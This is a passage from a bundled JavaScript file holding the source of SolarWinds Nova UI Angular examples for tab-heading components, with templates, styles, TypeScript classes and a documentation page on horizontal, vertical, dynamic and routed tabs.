tab.icon.inactiveColor\n                        "\n                    ></nui-icon>\n                    <div class="ellipsis">\n                        <span [title]="tab.title">{{ tab.title }}</span>\n                    </div>\n                </div>\n            </div>\n        </nui-tab-heading>\n    </nui-tab-heading-group>\n\n    <div *ngFor="let tab of tabsetContent">\n        <nui-content size="small" *ngIf="currentTabId === tab.id">\n            <p>\n                Tab titeled <strong>{{ tab.title }}</strong> with id\n                <strong>{{ tab.id }}</strong\n                >. It\'s content goes below:\n            </p>\n            <p>{{ tab.content }}</p>\n        </nui-content>\n    </div>\n</div>\n'},41843:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".ellipsis {\n    max-width: 100px;\n    overflow: hidden;\n    text-overflow: ellipsis;\n}\n"},87487:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectorRef, Component, Input } from "@angular/core";\n\n@Component({\n    selector: "nui-tab-heading-group-with-content-example",\n    templateUrl: "./tab-heading-group-with-content.example.component.html",\n    styleUrls: ["./tab-heading-group-with-content.example.component.less"],\n})\nexport class TabHeadingGroupWithContentExampleComponent {\n    @Input() public icon: boolean = false;\n\n    public currentTabId: string;\n\n    public tabsetContent = [\n        {\n            id: "1",\n            title: $localize`Tab with really long content`,\n            icon: {\n                name: "gear",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            content:\n                "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Ut eu.",\n            isDisabled: false,\n        },\n        {\n            id: "2",\n            title: $localize`Tab 2`,\n            icon: {\n                name: "check",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            content: `Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam sed erat eget\n                     velit elementum ultricies vitae vel mauris. Nam egestas fermentum ex id interdum.\n                     In in dignissim libero. Suspendisse commodo pellentesque purus, sit amet tempor enim\n                     viverra at. Nam cursus sed lectus imperdiet imperdiet. Pellentesque vel tincidunt dolor.\n                     Aliquam bibendum ac lectus id consectetur. Sed eget purus id dolor ultricies rhoncus.\n                     Vivamus ac magna nulla. Nam vel pellentesque ex. Nunc eu metus euismod, dignissim lorem id,\n                     pulvinar tellus. Vestibulum sed nisi quis sapien varius vehicula. Proin dictum eu mauris quis aliquet.\n                     Vestibulum accumsan eros ac mollis hendrerit. Aenean aliquet sem eros, sit amet ornare tellus tincidunt vitae.`,\n            isDisabled: false,\n        },\n        {\n            id: "3",\n            title: $localize`Tab 3`,\n            icon: {\n                name: "acknowledge",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            content: "Should not be visible because the tab is disabled",\n            isDisabled: true,\n        },\n        {\n            id: "4",\n            title: $localize`Tab 4`,\n            icon: {\n                name: "add",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            content:\n                "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Ut eu.",\n            isDisabled: false,\n        },\n    ];\n\n    constructor(private changeDetector: ChangeDetectorRef) {}\n\n    public updateContent(tabId: string): void {\n        this.currentTabId = tabId;\n        this.changeDetector.detectChanges();\n    }\n}\n'},12245:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <nui-tab-heading-group [vertical]="true" (selected)="updateContent($event)">\n        <nui-tab-heading\n            *ngFor="let tab of tabsetContent"\n            [disabled]="tab.isDisabled"\n            [tabId]="tab.id"\n        >\n            <div class="d-flex align-content-center">\n                <div class="d-inline-flex align-items-center">\n                    <nui-icon\n                        [icon]="tab.icon.name"\n                        [iconColor]="\n                            tab.isDisabled\n                                ? tab.icon.disabledColor\n                                : currentTabId === tab.id\n                                ? tab.icon.activeColor\n                                : tab.icon.inactiveColor\n                        "\n                    >\n                    </nui-icon>\n                </div>\n            </div>\n        </nui-tab-heading>\n    </nui-tab-heading-group>\n</div>\n'},91505:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectorRef, Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tab-heading-group-with-icons-example",\n    templateUrl: "./tab-heading-group-with-icons.example.component.html",\n})\nexport class TabHeadingGroupWithIconsExampleComponent {\n    public currentTabId: string;\n\n    public tabsetContent = [\n        {\n            id: "1",\n            title: $localize`Tab 1`,\n            icon: {\n                name: "gear",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            isDisabled: false,\n        },\n        {\n            id: "2",\n            title: $localize`Tab 2`,\n            icon: {\n                name: "check",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            isDisabled: false,\n        },\n        {\n            id: "3",\n            title: $localize`Tab 3`,\n            icon: {\n                name: "acknowledge",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            isDisabled: true,\n        },\n        {\n            id: "4",\n            title: $localize`Tab 4`,\n            icon: {\n                name: "add",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            isDisabled: false,\n        },\n    ];\n\n    constructor(private changeDetector: ChangeDetectorRef) {}\n\n    public updateContent(tabId: string): void {\n        this.currentTabId = tabId;\n        this.changeDetector.detectChanges();\n    }\n}\n'},70910:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='import { TabContentAboutExampleComponent } from "./tab-content/about/tab-content-about.example.component";\nimport { TabContentSettingsExampleComponent } from "./tab-content/settings/tab-content-settings.example.component";\nimport { TabContentStatisticsExampleComponent } from "./tab-content/statistics/tab-content-statistics.example.component";\nimport { TabHeadingGroupWithRouterExampleComponent } from "./tab-heading-group-with-router.example.component";\n\nexport const ROUTES = [\n    {\n        path: "",\n        component: TabHeadingGroupWithRouterExampleComponent,\n        children: [\n            {\n                path: "tab-statistics",\n                component: TabContentStatisticsExampleComponent,\n            },\n            {\n                path: "tab-settings",\n                component: TabContentSettingsExampleComponent,\n            },\n            {\n                path: "tab-about",\n                component: TabContentAboutExampleComponent,\n            },\n        ],\n    },\n];\n'},67455:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-content size="large">\n    <p class="h2">{{ pageTitle }}</p>\n    <p>{{ content }}</p>\n</nui-content>\n'},57127:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-content-about-example",\n    templateUrl: "./tab-content-about.example.component.html",\n})\nexport class TabContentAboutExampleComponent {\n    public content: string = `Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam sed erat eget\n    velit elementum ultricies vitae vel mauris. Nam egestas fermentum ex id interdum.\n    In in dignissim libero. Suspendisse commodo pellentesque purus, sit amet tempor enim\n    viverra at. Nam cursus sed lectus imperdiet imperdiet. Pellentesque vel tincidunt dolor.\n    Aliquam bibendum ac lectus id consectetur. Sed eget purus id dolor ultricies rhoncus.\n    Vivamus ac magna nulla. Nam vel pellentesque ex. Nunc eu metus euismod, dignissim lorem id,\n    pulvinar tellus. Vestibulum sed nisi quis sapien varius vehicula. Proin dictum eu mauris quis aliquet.\n    Vestibulum accumsan eros ac mollis hendrerit. Aenean aliquet sem eros, sit amet ornare tellus tincidunt vitae.`;\n\n    public pageTitle: string = "About";\n}\n'},93031:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-content size="large">\n    <p class="h2">{{ tabTitle }}</p>\n    <p>{{ content }}</p>\n    <form [formGroup]="dynamicForm">\n        <nui-form-field\n            class="d-block mb-4"\n            caption="Password"\n            i18n-caption\n            [control]="dynamicForm.controls[\'password\']"\n            id="nui-form-field-dynamic-disabling"\n        >\n            <nui-textbox\n                id="nui-form-field-dynamic-disabling-password"\n                formControlName="password"\n                (textChange)="onPasswordBlurred()"\n            ></nui-textbox>\n            <nui-validation-message for="required" i18n>\n                This is required\n            </nui-validation-message>\n        </nui-form-field>\n        <nui-form-field\n            caption="Confirm Password"\n            i18n-caption\n            [control]="dynamicForm.controls[\'confirmPassword\']"\n        >\n            <nui-textbox\n                id="nui-form-field-dynamic-disabling-confirm-password"\n                formControlName="confirmPassword"\n            ></nui-textbox>\n            <nui-validation-message for="required" i18n>\n                This is required\n            </nui-validation-message>\n        </nui-form-field>\n    </form>\n</nui-content>\n'},42111:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\n\n@Component({\n    selector: "nui-content-settings-example",\n    templateUrl: "./tab-content-settings.example.component.html",\n})\nexport class TabContentSettingsExampleComponent {\n    public content: string =\n        "You can change your password using the form below:";\n    public tabTitle: string = "Account Settings";\n\n    public dynamicForm;\n    public visibleRadio: boolean;\n\n    constructor(private formBuilder: FormBuilder) {\n        this.dynamicForm = this.formBuilder.group({\n            password: this.formBuilder.control("", Validators.required),\n            confirmPassword: this.formBuilder.control(\n                { value: "", disabled: true },\n                Validators.required\n            ),\n        });\n    }\n\n    public onPasswordBlurred(): void {\n        if (this.dynamicForm.controls.password.valid) {\n            this.dynamicForm.controls.confirmPassword.enable();\n        } else {\n            this.dynamicForm.controls.confirmPassword.disable();\n        }\n    }\n\n    public toggleRadio(): void {\n        this.visibleRadio = !this.visibleRadio;\n    }\n}\n'},66583:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-content size="large">\n    <p class="h2">{{ tabTitle }}</p>\n    <p>{{ content }}</p>\n    <hr />\n    <div class="d-flex flex-row justify-content-start">\n        <div class="flex-column">\n            <div class="container">Enable Statistics</div>\n            <div class="container">Enable Thresholds</div>\n            <div class="container">Activate Superpower</div>\n        </div>\n        <div class="flex-column">\n            <nui-switch [(value)]="isFirstOn"></nui-switch>\n            <nui-switch [(value)]="isSecondOn"></nui-switch>\n            <nui-switch [(value)]="isThirdOn"></nui-switch>\n        </div>\n    </div>\n</nui-content>\n'},37647:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Input } from "@angular/core";\n\n@Component({\n    selector: "nui-content-statistics-example",\n    templateUrl: "./tab-content-statistics.example.component.html",\n})\nexport class TabContentStatisticsExampleComponent {\n    public tabTitle: string = "Statistics Options";\n\n    public content: string = `Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam sed erat eget\n    velit elementum ultricies vitae vel mauris. Nam egestas fermentum ex id interdum.\n    In in dignissim libero. Suspendisse commodo pellentesque purus, sit amet tempor enim`;\n\n    @Input() public isFirstOn: boolean = false;\n    @Input() public isSecondOn: boolean = true;\n    @Input() public isThirdOn: boolean = false;\n}\n'},73135:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <nui-tab-heading-group>\n        <nui-tab-heading\n            *ngFor="let tab of tabsetContent"\n            [tabId]="tab.id"\n            routerLink="/tabgroup/{{ tab.id }}"\n            [active]="currentTabRoute === tab.id"\n        >\n            <div class="d-flex align-content-center">\n                <div class="d-inline-flex align-items-center">\n                    <nui-icon\n                        *ngIf="icon && tab !== tabsetContent[2]"\n                        [icon]="tab.icon.name"\n                        [iconColor]="\n                            currentTabRoute === tab.id\n                                ? tab.icon.activeColor\n                                : tab.icon.inactiveColor\n                        "\n                    ></nui-icon>\n                    <span\n                        class="pl-2"\n                        *ngIf="tab !== tabsetContent[0]"\n                        [title]="tab.title"\n                        >{{ tab.title }}</span\n                    >\n                </div>\n            </div>\n        </nui-tab-heading>\n    </nui-tab-heading-group>\n\n    \x3c!-- Tab content is placed below depending on the component used in a certain routing --\x3e\n    <router-outlet></router-outlet>\n</div>\n'},97979:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".ellipsis {\n    max-width: 100px;\n    overflow: hidden;\n    text-overflow: ellipsis;\n}\n"},33815:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Input, OnDestroy } from "@angular/core";\nimport { NavigationEnd, Router } from "@angular/router";\n\n@Component({\n    selector: "nui-tab-heading-group-with-router-example",\n    templateUrl: "./tab-heading-group-with-router.example.component.html",\n    styleUrls: ["./tab-heading-group-with-router.example.component.less"],\n})\nexport class TabHeadingGroupWithRouterExampleComponent implements OnDestroy {\n    public currentTabRoute: string;\n\n    @Input() public icon: boolean = false;\n    public tabsetContent = [\n        {\n            id: "tab-settings",\n            title: $localize`Settings`,\n            icon: {\n                name: "gear",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n        },\n        {\n            id: "tab-statistics",\n            title: $localize`Statistics`,\n            icon: {\n                name: "check",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n        },\n        {\n            id: "tab-about",\n            title: $localize`About`,\n            icon: {\n                name: "add",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n        },\n    ];\n    private routeSubscription = this._router?.events.subscribe((event) => {\n        if (event instanceof NavigationEnd) {\n            const path: string[] = event.urlAfterRedirects.split("/");\n            this.currentTabRoute = path[path.length - 1];\n        }\n    });\n\n    constructor(private _router: Router) {}\n\n    public ngOnDestroy(): void {\n        this.routeSubscription?.unsubscribe();\n    }\n}\n'},94015:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiTabsModule</code>\n    </li>\n</ul>\n\n<h2>Tabs Overview</h2>\n<p>\n    The <code>TabHeading</code> and\n    <code\n        ><a\n            href="https://nova-ui.solarwinds.io/bits/main/components/TabHeadingGroupComponent.html#info"\n            target="_blank"\n        >\n            TabHeadingGroup</a\n        ></code\n    >\n    components are the building blocks for setting up the number of tabs that\n    can accept data and controlling the content linked to them.\n</p>\n<p>\n    The <code>TabHeading</code> component is an improved version of the legacy\n    <code>Tab</code>, which is fully dependent on\n    <code\n        ><a\n            href="https://nova-ui.solarwinds.io/bits/main/components/TabHeadingGroupComponent.html#info"\n            target="_blank"\n            >TabHeadingGroup</a\n        ></code\n    >, a descendant of <code>TabGroup</code>. <code>TabHeading</code> delivers a\n    proper layout and styling that corresponds to UX requirements, and accepts\n    any content. Users are free to put anything inside the\n    <code>TabHeading</code>, whether it\'s an icon, text, or anything else. The\n    <code>TabHeading</code> component doesn\'t provide any layout alignments for\n    its content and only styles the text according to UX mockups.\n    <code>TabHeading</code> has several inputs that allow you to set the\n    component to an active or inactive state or assign a unique index to the tab\n    to correlate it with content provided by user. A tab also emits an event via\n    its <code>selected</code> output whenever it becomes active.\n</p>\n<p>\n    <code>TabHeadingGroup</code> manages the <code>TabHeading</code> component\n    state and placement direction, providing necessary styles and layout for\n    properly displaying <code>TabHeading</code> components in a group.\n    <code>TabHeadingGroup</code>\'s <code>vertical</code> input changes the\n    direction of tab placement to vertical mode, and its\n    <code>selected</code> output emits the id of the selected\n    <code>TabHeading</code>.\n</p>\n\n\x3c!-- ------------------------------------------------------------------------------------------------------ --\x3e\n\n<h2>Horizontal Tabs</h2>\n<nui-message type="warning" [allowDismiss]="false">\n    <strong>Pay Attention!</strong> This and other examples below contain\n    <strong>disabled</strong> tabs, which are NOT approved by UX who consider\n    using disabled tabs to be a bad practice. Sync with your UX team on the\n    matter before using them.\n</nui-message>\n<p>\n    Probably the most common use case is placing tabs horizontally.\n    <code>TabHeadingGroup</code> component sets the\n    <code>TabHeading</code> direction via its <code>vertical</code> input which\n    is set to <code>false</code> by default. Provide a config for each\n    <code>TabHeading</code> with the desired tab title and other contents.\n    <strong\n        >Only the tab title <i>font</i> is being formatted by the\n        component!</strong\n    >\n    This means user is responsible for the layout and styles of any contents\n    they put within the tabs except the tab title.\n    <br />\n    <mark>\n        <strong>Note</strong> that the icon color must follow the tab title\n        color,\n        <a href="https://marvelapp.com/5d7h3hd/screen/46562834" target="_blank"\n            >according to UX requirements</a\n        >\n    </mark>\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="tab-heading-group-horizontal"\n    exampleTitle="Tab Heading Group with Horizontal Alignment of Tabs"\n>\n    <div class="row">\n        <div class="col">\n            <nui-tab-heading-group-horizontal-example></nui-tab-heading-group-horizontal-example>\n        </div>\n    </div>\n</nui-example-wrapper>\n\n\x3c!-- ------------------------------------------------------------------------------------------------------ --\x3e\n\n<h2>Horizontal Tabs with Icons</h2>\n<p>\n    In this examples it is clearly seen how icons can be added to the tab title\n    and properly aligned with the text.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="tab-heading-group-horizontal-with-icons"\n    exampleTitle="Tab Heading Group with Horizontal Alignment of Tabs and Icons"\n>\n    <div class="row">\n        <div class="col">\n            <nui-tab-heading-group-horizontal-with-icons-example></nui-tab-heading-group-horizontal-with-icons-example>\n        </div>\n    </div>\n</nui-example-wrapper>\n\n\x3c!-- ------------------------------------------------------------------------------------------------------ --\x3e\n<h2>Horizontal Tabs with Icons Only</h2>\n<p>\n    If icons is the only thing you want tabs to render - this is how you do it.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="tab-heading-group-horizontal-with-icons-only"\n    exampleTitle="Tab Heading Group with Icons Only Alignened Horizontally"\n>\n    <div class="row">\n        <div class="col">\n            <nui-tab-heading-group-horizontal-with-icons-only-example></nui-tab-heading-group-horizontal-with-icons-only-example>\n        </div>\n    </div>\n</nui-example-wrapper>\n\n\x3c!-- ------------------------------------------------------------------------------------------------------ --\x3e\n\n<h2>Vertical Tabs</h2>\n<p>\n    User is allowed to easily place the tab headings vertically using the\n    <code>vertical</code> input of the <code>TabHeadingGroup</code> component.\n    <br />\n    Note that, for the purposes of this example, each\n    <code>TabHeading</code> has <strong>max-width</strong> set to\n    <mark>250px</mark>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="tab-heading-group-vertical"\n    exampleTitle="Tab Heading Group with Vertical Alignment of Tabs"\n>\n    <div class="d-flex flex-row">\n        <div class="d-flex flex-column">\n            <nui-tab-heading-group-vertical-example></nui-tab-heading-group-vertical-example>\n        </div>\n    </div>\n</nui-example-wrapper>\n\n\x3c!-- ------------------------------------------------------------------------------------------------------ --\x3e\n\n<h2>Vertical Tabs with Icons</h2>\n<p>Icons can be added to the vertically aligned tabs iwth ease here as well.</p>\n<nui-example-wrapper\n    filenamePrefix="tab-heading-group-vertical"\n    exampleTitle="Tab Heading Group with Icons and Vertical Alignment of Tabs"\n>\n    <div class="d-flex flex-row">\n        <div class="d-flex flex-column">\n            <nui-tab-heading-group-vertical-with-icons-example></nui-tab-heading-group-vertical-with-icons-example>\n        </div>\n    </div>\n</nui-example-wrapper>\n\n\x3c!-- ------------------------------------------------------------------------------------------------------ --\x3e\n\n<h2>Vertical Tabs with Icon Only</h2>\n<p>This example uses icons as the only <code>TabHeading</code> content.</p>\n\n<nui-example-wrapper\n    filenamePrefix="tab-heading-group-with-icons"\n    exampleTitle="Vertically Aligned Tab Heading Group with Icon Tabs"\n>\n    <div class="d-flex flex-row">\n        <div class="d-flex flex-column">\n            <nui-tab-heading-group-with-icons-example></nui-tab-heading-group-with-icons-example>\n        </div>\n    </div>\n</nui-example-wrapper>\n\n\x3c!-- ------------------------------------------------------------------------------------------------------ --\x3e\n\n<h2>Responsive Tab Headings</h2>\n<p>\n    If there are too many tabs to fit the parent container, the\n    <code>TabHeadingGroup</code> behaves responsively by adding navigation\n    arrows to allow the user to scroll back and forth among the tabs.\n</p>\n<nui-example-wrapper\n    filenamePrefix="tab-heading-group-responsive"\n    exampleTitle="Responsive Tab Heading Group"\n>\n    <nui-tab-heading-group-responsive-example></nui-tab-heading-group-responsive-example>\n</nui-example-wrapper>\n\n\x3c!-- ------------------------------------------------------------------------------------------------------ --\x3e\n\n<h2>Tab Headings with Content</h2>\n<p>\n    The following example demonstrates how to display the content associated\n    with a tab when the user switches from one tab to another.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="tab-heading-group-with-content"\n    exampleTitle="Tab Heading Group with Content"\n>\n    <nui-tab-heading-group-with-content-example\n        icon="true"\n    ></nui-tab-heading-group-with-content-example>\n</nui-example-wrapper>\n\n\x3c!-- ------------------------------------------------------------------------------------------------------ --\x3e\n\n<h2>Dynamic Tabs</h2>\n<p>The following example demonstrates how to dynamically add or remove tabs.</p>\n<p>\n    <mark>\n        <strong>Note</strong> that handling switching to another tab, after\n        active tab is deleted, happens in example code, not inside the\n        framework!\n    </mark>\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="tab-heading-group-dynamic"\n    exampleTitle="Dynamic Tabs"\n>\n    <nui-tab-heading-group-dynamic-example></nui-tab-heading-group-dynamic-example>\n</nui-example-wrapper>\n\n\x3c!-- ------------------------------------------------------------------------------------------------------ --\x3e\n\n<h2>Tab Headings with Router</h2>\n<p>\n    For more complex scenarios it might be useful to set up routing for the tabs\n    to dynamically change the contents through the <mark>router-outlet</mark>.\n    In this case each tab with corresponding content will be accessible via its\n    own link.<br />\n</p>\n<p>\n    To successfully add routing one has to add corresponding routing settings to\n    the module. Add children router for the tabs.\n    <nui-expander i18n-header header="Click to View Configuration">\n        <nui-example-code>\n            {{ tabsRouteConfig }}\n        </nui-example-code>\n    </nui-expander>\n</p>\n<p>\n    In the following example it is assumed that the contents for each tab are\n    rendered from a separate component and that the tab\'s unique\n    <strong>id</strong> matches its route.\n</p>\n<p>\n    <nui-message type="warning" allowDismiss="true">\n        Because this example is in the iframe you won\'t see the route changes.\n        To watch routes change in browser\'s address bar please navigate to\n        <a href="./#/tabgroup" target="_blank">this exmaples page</a>. The link\n        opens in a new tab.\n    </nui-message>\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="tab-heading-group-with-router"\n    exampleTitle="Tab Heading Group with Router"\n>\n    <nui-tab-heading-group-with-router-example\n        icon="true"\n    ></nui-tab-heading-group-with-router-example>\n</nui-example-wrapper>\n'},487:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS 